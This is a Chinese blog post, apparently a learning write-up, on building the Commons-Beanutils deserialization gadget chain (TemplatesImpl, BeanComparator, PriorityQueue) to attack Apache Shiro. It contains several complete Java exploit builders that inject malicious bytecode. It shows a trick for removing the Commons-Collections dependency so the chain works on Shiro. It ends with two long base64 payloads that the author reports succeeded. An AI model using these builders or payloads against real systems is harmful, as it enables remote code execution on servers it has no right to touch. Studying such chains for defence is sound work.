<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BeanTest</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;aaa&quot;</span>,<span class="number">18</span>);</span><br><span class="line">        System.out.println(person.getName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>PropertyUtils.getProperty的使用示例如下，他就会自动的去调用Person类的get方法，我们传入的是name属性，它会自动把这个属性的命名自动改为固定格式的形式，这里就会转为’Name’，调用的方法就是getName和setName方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BeanTest</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;aaa&quot;</span>,<span class="number">18</span>);</span><br><span class="line">        System.out.println(PropertyUtils.getProperty(person,<span class="string">&quot;name&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="FAbOm">getOutputProperites</h4>
在`TemplatesImpl`中有一个`getOutputProperties`方法，这个格式的命名就很符合Javabean，且他的方法调用了`newTransformer`方法，他是可以动态加载类的

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> Properties <span class="title function_">getOutputProperties</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> newTransformer().getOutputProperties();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (TransformerConfigurationException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们尝试用这个来执行一下代码</p>
<p>调用<code>getOutputProperties</code>就可以成功加载恶意类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tl</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;CC3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\temporary\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        PropertyUtils.getProperty(templates,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="iPf3O">CB攻击链分析 </h4>
<h5 id="PqGts">逻辑理解</h5>
现在我们需要找谁调用了这个PropertyUtils.getProperty方法，我们可以在BeanComparetor中找到它的身影，在它的compare中调用了这PropertyUtils.getProperty方法，且this.property我们也是可以控制的

<p>正好我们之前也有调用compare的入口方法，这样就接上了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//BeanComparetor</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(Object o1, Object o2)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.property == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.comparator.compare(o1, o2);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> PropertyUtils.getProperty(o1, <span class="built_in">this</span>.property);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> PropertyUtils.getProperty(o2, <span class="built_in">this</span>.property);</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.comparator.compare(value1, value2);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IllegalAccessException var5) &#123;</span><br><span class="line">                <span class="type">IllegalAccessException</span> <span class="variable">iae</span> <span class="operator">=</span> var5;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;IllegalAccessException: &quot;</span> + iae.toString());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">                <span class="type">InvocationTargetException</span> <span class="variable">ite</span> <span class="operator">=</span> var6;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;InvocationTargetException: &quot;</span> + ite.toString());</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var7) &#123;</span><br><span class="line">                <span class="type">NoSuchMethodException</span> <span class="variable">nsme</span> <span class="operator">=</span> var7;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;NoSuchMethodException: &quot;</span> + nsme.toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>大概就是这样的，我们来验证一下</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735114633223-cd497c08-e608-4861-a437-be208906425d.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735114633223-cd497c08-e608-4861-a437-be208906425d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>最终代码如下（这个是自己思考的哟，自己写出来的，但是中间有好多东西都迷糊，看一下组长的把）</p>
<p>思考了一下，add的参数是数字时候，会调用Integer类的getOutputProperties方法，而它是没有这个方法的，所以会报错，我这里通过反射修改size的值，以便达到遍历的目的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tl</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;CC3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\temporary\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(beanComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line"></span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">PriorityQueue</span>&gt; aClass = priorityQueue.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        size.set(priorityQueue, <span class="number">2</span>);</span><br><span class="line">        </span><br><span class="line"><span class="comment">//        serialize(priorityQueue);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h5 id="Z5Oeo">调整</h5>
但是在用来打shiro的时候，会报一个错误

<p>因为在CB编写的时候，就有些东西是和CC来配合的，在<code>BeanComparator</code>的构造函数中，会默认调用<code>ComparableComparator</code>的<code>getInstance</code>方法，而<code>ComparableComparator</code>是cc依赖中的，shiro中默认没有带cc依赖，导致的错误发生</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BeanComparator</span> <span class="keyword">implements</span> <span class="title class_">Comparator</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> String property;</span><br><span class="line">    <span class="keyword">private</span> Comparator comparator;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BeanComparator</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>((String)<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BeanComparator</span><span class="params">(String property)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>(property, ComparableComparator.getInstance());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>而<code>BeanComparator</code>还有一个构造函数如下，里面的<code>Comparator</code>是可以自己传的，所以我们可以用这个构造函数来绕过cc的依赖</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">BeanComparator</span><span class="params">(String property, Comparator comparator)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.setProperty(property);</span><br><span class="line">        <span class="keyword">if</span> (comparator != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.comparator = comparator;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.comparator = ComparableComparator.getInstance();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我自己的代码如下</p>
<p>在<code>beanComparator</code>这里传入一个不为cc依赖的<code>Comparator</code>即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tl</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;CC3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\temporary\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>,<span class="keyword">new</span> <span class="title class_">BeanComparator</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(beanComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line"></span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">PriorityQueue</span>&gt; aClass = priorityQueue.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">size</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;size&quot;</span>);</span><br><span class="line">        size.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        size.set(priorityQueue, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>生成payload后，去打shiro框架（不知道为什么在）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">6JedmeHoSoeUuSUAr/U5YdK2+ZpPPD5aofKFBFoKOp<span class="comment">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</span></span><br></pre></td></tr></table></figure>

<p>也是成功加载了恶意代码</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735122730744-e269048e-762c-42b2-aa73-bd6cd5a95f7e.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1735122730744-e269048e-762c-42b2-aa73-bd6cd5a95f7e.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h5 id="NfPt4">组长的代码~</h5>
组长的代码如下，组长的代码是在add方法时候会报错导致序列化不成功（这里是在传入Intger时，也会调用Integer类的getOutputProperties的方法，但是他实际没有这个方法所以报错），所以在向PriorityQueue传入Comparator时，组长传入一个无用的`TransformingComparator`，然后通过反射修改回来（这里还有一个方法，在add时，只添加数字，后续通过反射修改回来）

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">tl</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates, <span class="string">&quot;CC3&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code= Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\temporary\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;code&#125;;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tl.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        bytecodes.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">BeanComparator</span> <span class="variable">beanComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;outputProperties&quot;</span>,<span class="keyword">new</span> <span class="title class_">BeanComparator</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;PriorityQueue&gt; priorityQueueClass = PriorityQueue.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> priorityQueueClass.getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(priorityQueue, beanComparator);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>生成payload后，也是能成功打通的（还是组长的好哇）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HNHE2+QzTA2hE+Z40rjHh2eX6Onde/rnm7DAm42IOYcgZgqqjvZP+ueiCX9mo+r7XJ/GHYK6G2jhTz25+5UGvbaZpGWUaJZGXmr4GcQGh+hQ8YRrQLLuH3ENgH7wHibNVPDI7Y6tGv3dQ1EQjywQtztK605ylB2JHEyy21US6LwU7wAa3sREcwWsNQclvNa44kRjkqi1TzQwou+OU95pQP06h<span class="comment">//vI7xxStbduNmKDq47nWjsLlNR1XbgvvVY9oyqCJwoQIY4oPVPzPH700hjX16sISHoJ2mqqWcA2RxDOg+XVyv0hofHDplUP8PXzpYRV75P58BUtU37aiRI/SJaaH5zbiBP9EZYW/WPibPurWptCuMQ3BO6DPxQCsfsCRoemof6iporGxXEWY5LBEIMaGI1eZtnSnw7rn585HsVsdJOKALoEZYJu76EhUnPB83ujZbla0GXJ452IaVukpanWXgqJfrmNMxC7uGWaRwcxmAxS6ZEpF0EywAb+GmKKI0l2zrAHxaOoGe0s6dQ9DIObHwmWMXDJJdxqw98FIvTq8GGGLueseUY3Elkuu2ZLOHqQzzF6yb3Id/Q09VA9SoDQqs84nnkq28cFPhSoVK6f9wae1kr0PHNcORDH9MKB810R7e6rKuPl5voF0fsG/aMoyIi8BQkenwEuoDczmFpw5pFUP+BQaAWLnN1IKmxkK7VrEIXXCoCBoH3E03kg288xB/HAFy4AsGjEMC32htCgrixMVvPCLt08hSEz3LeWULrlVRW3CR4stWEHC2dAsFmKq7Lktgd9D3BuXH4pAeTmMs0wBRTTYfLJKDnPkD9onOBH0gVohAK6xh/B+65Wn5NyAm345A+VicGX9WR/7pa8B8ixELAk5bPsk6crRc6muBbN/1KkjLOikGGVdD5WFf1TUGmHqdR+m9RnFP5jA2XY40/Z6PdjeDkwUPyxl/LY70ma/T8hoc3fTD+vQZCNldirUyGaxaoOYXY64EXqUwxzKnxLJzWdp13MDtCi7KMYG+xucwfJ9Uefrdxo1dqupGE3/vK0f2JK19c/Jl1FIDVdz8zGFNXlwljsU5mk7mhrtC8Sx9TLFCZTyfPQU56b+fD8JgP4OiD86KJMMBLdQoE4p0cz0rijED916ttVBSePZM6gJBroIZgGRsGOOLCCjkdJkXy9hAvBaqRKw7x7687IdjULnC2bPSkEcyp2nhZtUK1JVw3JwvBQ4p3F0eHuGQmMNYLb/3U74VtYob3HM9C2LAx7yWwwv/PmwP0/OlQ5g+v9RzrlGzBr/yfJbv2QE9dyaSK0adI2fpiazGdqKRfApMK2kQ2cBxTcedIlbuUbK9DIVk6VduBfsogCprYBq9mE4To1dJ4sCUaeFftWtqv+CbHJTy6Zo4ELiZ5AiVgLlxZz7mwnieH26NBaA7/dEXsUBoCGjEkf0AOKyhehN5pdb1iM2bdT8yn6dTMXKlkm3Twyqngowwldv4Ius56Cz0O7UfuKousZPbCNdu0qE4xPGMuJxirgWgxXS1FsHzwYzmqKyovIswiV/N88mqGxDYWQFAKIQF+IZ69pVHh91GKRfSs4gMRO5KXNgWDm8Y4/MKx/pFIgDBeWn8KlifCgqSxxcRFvo+0GHQT9Dua5pvCpaLLz27as24vLQIy720LqxqoRESgccp8lDLs1STNSykCROOppX+QfcmHp/91t4Lsv9gZJB7Hbkx6gnELC2vA66HU8ok1//2/ZMKU6o9EW1MWZj0IfZ0M1wc137Xsi8SklpcCrSGjOlc6CjNY1UmmI/gB4LV4PxXHXQZhTT2s7dd1J61qi22Cu1XVd+ccpLufZNCjf0LJHxeCOQhXjKXtZRFgyMG+T7tNrx7kRGtAw2lEdZXntN10QyBX8WnZxr+hRJfJ11Ke7OMS6AbeRuOAo52eVCyj7TzcRv0oFnqG8p656Ei+wrvqo7I00ZCVAtUNhHccBbyhyomlEIfWRL4UAaFBFoAaRSo0wdFeLJWT3JBynmarsw59yvXX1TUElXs4Hh238xhdt6PfYDpxwS8kvLiEM6YaXCe7I2Xz05xCLHcqhnOh2DHWX/PBCR3Zwl8xaTryI8ZFJE0I9kYWOZaxkd2mJenEkVpdvp7EBuY2pOW4XmciB3PkgciZ75K48BDJ+/mPa0rk37GkmFzHe2AI8ivhbYz67Ocln8EP98muVpSxz8B2hYx3znAgWWiTi988yv51PoKF9YkDU3/9aM3rHaob4M93irXmZOO6Ho/5N4cezunQMlGjA7HTNgwtJ7MSsnpJ3tJ1GcgnyRB8zrh1fg+H6yJelBCnq4I/qsWOtoc2AHSRfXRBfNNte09w/wPuD7EwaY5PAFnbRdkuRfRpuBj+mHICLByWN1XQmCH/EkVQFOttpaQTdtXOreVDQCmhP0gBymBlt0wZnWvs93VCk05VFjeS/DdosZg+l1zJ4PtDCLsdFiOPhdpKHOlswPwEKz2HCQiDTfHMw8AnfAFknXV5WONMsu+rkdGXHgfgIvxd2tZ6HuFMgtYTzV/k8/EOqUE6J9+jXPU4Umc3RXRwbubnyJ0N3aA/+0OvDVPHCXQrtncIrReVYLaSTk1ZJ7Y4G+xfbjLGOn+QpdcW9jgAvMf4K5GsTQvc9TxQAlDwYrvok308vCwk0sSw/gIPPF/0KEm7TQi/QHafqqREDA0NO02MgUrtqiONl6G90ANdEJUepzMgQFPgNxCyT6A7QVwappJU/qleKemyYyGy3